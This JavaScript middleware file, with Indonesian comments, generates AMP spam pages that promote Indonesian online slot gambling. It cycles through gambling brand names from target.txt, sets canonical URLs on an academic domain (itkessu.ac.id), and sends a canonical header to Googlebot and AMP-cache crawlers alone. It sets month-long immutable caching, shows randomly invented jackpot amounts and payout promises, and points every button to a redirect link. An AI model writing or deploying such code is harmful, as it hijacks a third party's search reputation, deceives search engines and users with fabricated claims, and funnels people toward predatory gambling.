

export async function onRequest(context) {
  const { request, env, next } = context;
  const url = new URL(request.url);
  
  // Cek apakah request datang dari GoogleBot atau AMP cache
  const userAgent = request.headers.get('User-Agent') || '';
  const isFromGoogle = userAgent.includes('Googlebot') || userAgent.includes('Google-AMP');
  const isFromAMPCache = url.hostname.includes('cdn.ampproject.org') || 
                         url.hostname.includes('amp.cloudflare.com');
  
  // Jika ini adalah permintaan untuk target.txt, biarkan diproses normalnya
  if (url.pathname.endsWith('/target.txt')) {
    return next();
  }
  
  try {
    // Baca file target.txt (asumsi file ini ada di assets atau public folder)
    let targetContent;
    try {
      // Gunakan Cloudflare KV atau file system untuk membaca target.txt
      const targetResponse = await fetch(new URL('/target.txt', url.origin));
      
      if (!targetResponse.ok) {
        throw new Error(`Failed to fetch target.txt: ${targetResponse.status}`);
      }
      
      targetContent = await targetResponse.text();
    } catch (error) {
      console.error('Error loading target.txt:', error);
      // Jika target.txt tidak dapat dibaca, gunakan data fallback
      targetContent = 'rajawin\nasiampo\njpslot\njp138\ndewa138\ndewa99\ndewaslot77\nbigbos4d\nboss88\nslot99';
    }
    
    // Parse content dari target.txt menjadi array
    const sites = targetContent.split('\n')
      .map(line => line.trim())
      .filter(line => line.length > 0);
    
    // Cari tahu site mana yang sedang diakses
    const pathSegments = url.pathname.split('/').filter(segment => segment);
    const currentSite = pathSegments.length > 0 ? pathSegments[0].toLowerCase() : '';
    
    // Cek apakah site yang diakses ada dalam target.txt
    const foundSite = sites.find(site => 
      site.toLowerCase() === currentSite || 
      site.toLowerCase().replace(/[^a-z0-9]/g, '') === currentSite
    );
    
    if (foundSite || pathSegments.length === 0) {
      // Pilih site berdasarkan path atau gunakan random jika path kosong
      const siteToUse = foundSite || sites[Math.floor(Math.random() * sites.length)];
      
      // Buat canonical URL
      // Gunakan domain yang stabil untuk canonical URL
      const canonicalOrigin = 'https://itkessu.ac.id'; // Ganti dengan domain asli Anda
      const canonicalUrl = `${canonicalOrigin}/${siteToUse}/`;
      
      // Generate AMP HTML dengan self-contained design
      const ampHtml = generateAmpHtml(siteToUse, canonicalUrl, sites);
      
      // Tambahkan header AMP yang diperlukan
      const headers = new Headers();
      headers.set('Content-Type', 'text/html');
      headers.set('AMP-Cache-Transform', 'google;v="1..100"');
      
      // Jika request berasal dari GoogleBot, sertakan Link header untuk canonical
      if (isFromGoogle || isFromAMPCache) {
        headers.set('Link', `<${canonicalUrl}>; rel="canonical"`);
      }
      
      // Aktifkan cache yang jauh lebih lama - 30 hari (sebulan)
      const ONE_MONTH_IN_SECONDS = 30 * 24 * 60 * 60; // 30 hari dalam detik
      headers.set('Cache-Control', `public, max-age=${ONE_MONTH_IN_SECONDS}, s-maxage=${ONE_MONTH_IN_SECONDS}, immutable`);
      
      // Header tambahan untuk memastikan caching di berbagai sistem
      headers.set('Expires', new Date(Date.now() + ONE_MONTH_IN_SECONDS * 1000).toUTCString());
      headers.set('Surrogate-Control', `max-age=${ONE_MONTH_IN_SECONDS}`);
      headers.set('CDN-Cache-Control', `max-age=${ONE_MONTH_IN_SECONDS}`);
      
      // Opsional: Set ETag untuk validasi cache yang efisien
      const etag = `"${siteToUse}-${Date.now().toString(36)}"`;
      headers.set('ETag', etag);
      
      return new Response(ampHtml, {
        headers: headers
      });
    }
    
    // Jika site tidak ditemukan, lanjutkan ke handler berikutnya
    return next();
    
  } catch (error) {
    console.error('Error in middleware:', error);
    return new Response('Internal Server Error', { status: 500 });
  }
}

// Fungsi untuk menghasilkan HTML AMP lengkap dengan design seperti gambar referensi
function generateAmpHtml(siteName, canonicalUrl, allSites) {
  // Acak jackpot value
  const jackpotValue = generateRandomJackpot();
  
  // Generate deskripsi dan konten acak yang variatif
  const descriptions = [
    `${siteName.toUpperCase()} situs slot gacor terpercaya dengan koleksi game slot terlengkap, bonus menarik, dan jackpot terbesar. Daftar sekarang untuk maxwin paling tinggi!`,
    `Main slot online di ${siteName.toUpperCase()} dengan rtp tertinggi dan peluang maxwin besar. Nikmati bonus new member 100% dan pelayanan super kencang 24 jam.`,
    `${siteName.toUpperCase()} salah satu situs slot gacor terbaik datang kembali untuk membuka peluang kepada slotter handal dari indonesia untuk menjadi kaya. Deposit 10ribu sudah bisa wd jutaan!`,
    `Situs slot gacor ${siteName.toUpperCase()} paling aman ga pake ribet! Mainkan beragam game slot populer dengan peluang maxwin paling tinggi dan jackpot terbesar.`
  ];
  
  const randomDesc = descriptions[Math.floor(Math.random() * descriptions.length)];
  
  // Template HTML AMP lengkap dengan design mirip gambar
  return `<!doctype html>
<html ⚡ lang="id">
<head>
  <meta charset="utf-8">
  <title>${siteName.toUpperCase()} - SITUS SLOT GACOR PALING GAMPANG CUAN</title>
  <link rel="canonical" href="${canonicalUrl}">
  <meta name="viewport" content="width=device-width,minimum-scale=1,initial-scale=1">
  <meta name="description" content="${randomDesc}">
  <meta name="keywords" content="${siteName}, slot online, judi slot, slot gacor, slot maxwin, slot terpercaya, slot gampang menang">
  
  <!-- Meta tags khusus yang diminta -->
  <meta name='author' content='${siteName}' />
  <meta name='language' content='id-ID' />
  <meta name='robots' content='index, follow' />
  <meta name='Slurp' content='all' />
  <meta name='webcrawlers' content='all' />
  <meta name='spiders' content='all' />
  <meta name='allow-search' content='yes' />
  <meta name='YahooSeeker' content='index,follow' />
  <meta name='msnbot' content='index,follow' />
  <meta name='expires' content='never' />
  <meta name='rating' content='general'>
  <meta name='publisher' content='${siteName}'>
  <meta name='googlebot' content='index,follow' />
  
  <script async src="https://cdn.ampproject.org/v0.js"></script>
  <script async custom-element="amp-bind" src="https://cdn.ampproject.org/v0/amp-bind-0.1.js"></script>
  <script async custom-element="amp-analytics" src="https://cdn.ampproject.org/v0/amp-analytics-0.1.js"></script>
  <style amp-boilerplate>body{-webkit-animation:-amp-start 8s steps(1,end) 0s 1 normal both;-moz-animation:-amp-start 8s steps(1,end) 0s 1 normal both;-ms-animation:-amp-start 8s steps(1,end) 0s 1 normal both;animation:-amp-start 8s steps(1,end) 0s 1 normal both}@-webkit-keyframes -amp-start{from{visibility:hidden}to{visibility:visible}}@-moz-keyframes -amp-start{from{visibility:hidden}to{visibility:visible}}@-ms-keyframes -amp-start{from{visibility:hidden}to{visibility:visible}}@-o-keyframes -amp-start{from{visibility:hidden}to{visibility:visible}}@keyframes -amp-start{from{visibility:hidden}to{visibility:visible}}</style><noscript><style amp-boilerplate>body{-webkit-animation:none;-moz-animation:none;-ms-animation:none;animation:none}</style></noscript>

  <style amp-custom>
    /* Base Styles */
    *, *::before, *::after {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
    }
    
    body {
      font-family: 'Segoe UI', Tahoma, Arial, sans-serif;
      background-color: #0f0f0f;
      color: #ffffff;
      line-height: 1.6;
    }
    
    a {
      text-decoration: none;
      color: inherit;
    }
    
    /* Header Styles */
    .header {
      display: flex;
      justify-content: space-between;
      align-items: center;
      padding: 15px 20px;
      background-color: #0f0f0f;
      border-bottom: 1px solid rgba(255, 215, 0, 0.3);
    }
    
    .logo-container {
      display: flex;
      align-items: center;
    }
    
    .logo {
      max-width: 200px;
      height: auto;
    }
    
    .main-nav {
      display: flex;
      gap: 10px;
    }
    
    .login-btn {
      background: linear-gradient(to right, #e0a800, #ffc107);
      color: #000;
      padding: 8px 20px;
      border-radius: 20px;
      font-weight: bold;
      border: 2px solid #ffc107;
      text-shadow: 0 1px 0 rgba(255, 255, 255, 0.3);
      transition: all 0.3s ease;
    }
    
    .login-btn:hover {
      box-shadow: 0 0 15px rgba(255, 193, 7, 0.6);
      transform: translateY(-2px);
    }
    
    /* Main Content Styles */
    .main-container {
      max-width: 1200px;
      margin: 0 auto;
      padding: 20px;
      background-color: #1a1a1a;
      border-radius: 10px;
      box-shadow: 0 0 20px rgba(0, 0, 0, 0.5);
      margin-top: 30px;
      margin-bottom: 30px;
      position: relative;
      overflow: hidden;
    }
    
    .site-title {
      font-size: 16px;
      font-weight: 400;
      color: #ffffff;
      margin-bottom: 10px;
      text-transform: uppercase;
    }
    
    .hero-title {
      font-size: 32px;
      font-weight: 700;
      line-height: 1.2;
      margin-bottom: 20px;
      text-transform: uppercase;
      color: #ffffff;
    }
    
    .brand-highlight {
      display: block;
      font-size: 36px;
      color: #ffc107;
      margin-top: 10px;
      text-shadow: 0 0 10px rgba(255, 193, 7, 0.6);
    }
    
    .site-slogan {
      font-size: 14px;
      font-style: italic;
      color: #cccccc;
      margin-bottom: 30px;
    }
    
    /* Button Styles */
    .action-buttons {
      display: flex;
      gap: 15px;
      margin-top: 30px;
      margin-bottom: 30px;
    }
    
    .register-btn, .login-block-btn {
      display: block;
      width: 100%;
      padding: 12px;
      text-align: center;
      border-radius: 5px;
      font-weight: bold;
      text-transform: uppercase;
      font-size: 16px;
      cursor: pointer;
      transition: all 0.3s ease;
    }
    
    .register-btn {
      background: linear-gradient(to right, #ffcc00, #ffd700);
      color: #000000;
      border: none;
    }
    
    .login-block-btn {
      background: linear-gradient(to right, #3498db, #2980b9);
      color: #ffffff;
      border: none;
    }
    
    .register-btn:hover, .login-block-btn:hover {
      transform: translateY(-3px);
      box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
    }
    
    /* Site Info Styles */
    .site-headline {
      text-align: center;
      font-size: 24px;
      font-weight: 700;
      text-transform: uppercase;
      margin-top: 40px;
      margin-bottom: 20px;
      color: #ffc107;
    }
    
    .site-description {
      text-align: justify;
      color: #cccccc;
      margin-bottom: 30px;
      font-size: 14px;
      line-height: 1.6;
    }
    
    /* Footer Styles */
    .footer {
      background-color: #0a0a0a;
      padding: 15px;
      text-align: center;
      font-size: 12px;
      color: #888888;
      border-top: 1px solid rgba(255, 255, 255, 0.1);
    }
    
    /* Responsive Styles */
    @media (max-width: 768px) {
      .hero-title {
        font-size: 24px;
      }
      
      .brand-highlight {
        font-size: 28px;
      }
      
      .action-buttons {
        flex-direction: column;
      }
      
      .site-headline {
        font-size: 20px;
      }
    }
    
    @media (max-width: 480px) {
      .header {
        flex-direction: column;
        gap: 10px;
      }
      
      .hero-title {
        font-size: 20px;
      }
      
      .brand-highlight {
        font-size: 24px;
      }
      
      .site-headline {
        font-size: 18px;
      }
      
      .main-container {
        padding: 15px;
      }
    }
  </style>

  <!-- AMP State Data -->
  <amp-state id="siteData">
    <script type="application/json">
      {
        "name": "${siteName.toUpperCase()}",
        "canonicalUrl": "${canonicalUrl}",
        "jackpot": "${jackpotValue}"
      }
    </script>
  </amp-state>
</head>

<body>
  <!-- Header -->
  <header class="header">
    <div class="logo-container">
      <a href="https://jali.me/slotobetvip">
        <amp-img class="logo" src="https://pub-bc2ee8893baf416c8c23af0718d51fc3.r2.dev/slotgacorwin.gif"></amp-img>
      </a>
    </div>
    <nav class="main-nav">
      <a href="https://jali.me/slotobetvip" class="nav-link">Home</a>
      <a href="https://jali.me/slotobetvip" class="login-btn">Login ⭐️</a>
    </nav>
  </header>
  
  <!-- Main Content -->
  <main class="main-container">
    <div class="site-title">${siteName}</div>
    
    <h1 class="hero-title">
      COBA DAN RASAKAN MAIN SLOTMU DENGAN MAXWIN PALING TINGGI BERSAMA
      <span class="brand-highlight">${siteName.toUpperCase()}</span>
    </h1>
    
    <div class="site-slogan">Situs Slot Gacor Paling Aman Ga Pake Ribet!</div>
    
    <div class="action-buttons">
      <a href="https://jali.me/slotobetvip" class="register-btn">Daftar ${siteName}</a>
      <a href="https://jali.me/slotobetvip" class="login-block-btn">Login ${siteName}</a>
    </div>
    
    <h2 class="site-headline">${siteName.toUpperCase()} SITUS SLOT GACOR PALING PALING GAMPANG CUAN</h2>
    
    <div class="site-description">
      ${siteName.toUpperCase()} salah satu situs slot gacor terbaik datang kembali untuk membuka peluang kepada slotter handal dari indonesia untuk menjadi kaya. ${siteName} deposit 10ribu sudah bisa wd jutaan,pelayan super kencang,rtp akurat dan pastinya member baru lama pasti dimanja paling penting wd kecil besar wajib pay.
    </div>
    
    <!-- More site content can be added here -->
    
  </main>
  
  <!-- Footer -->
  <footer class="footer">
    <div class="copyright">Copyright © ${new Date().getFullYear()} ${siteName.toUpperCase()}. All rights reserved.</div>
  </footer>
</body>
</html>`;
}

// Fungsi untuk menghasilkan nilai jackpot acak
function generateRandomJackpot() {
  const billions = Math.floor(Math.random() * 10); // 0-9 milyar
  const millions = Math.floor(Math.random() * 1000); // 0-999 juta
  const thousands = Math.floor(Math.random() * 1000); // 0-999 ribu
  const hundreds = Math.floor(Math.random() * 1000); // 0-999 ratus
  
  return `Rp ${billions},${millions.toString().padStart(3, '0')},${thousands.toString().padStart(3, '0')},${hundreds.toString().padStart(3, '0')}`;
}

// Fungsi untuk mengacak array
function shuffleArray(array) {
  for (let i = array.length - 1; i > 0; i--) {
    const j = Math.floor(Math.random() * (i + 1));
    [array[i], array[j]] = [array[j], array[i]];
  }
  return array;
}
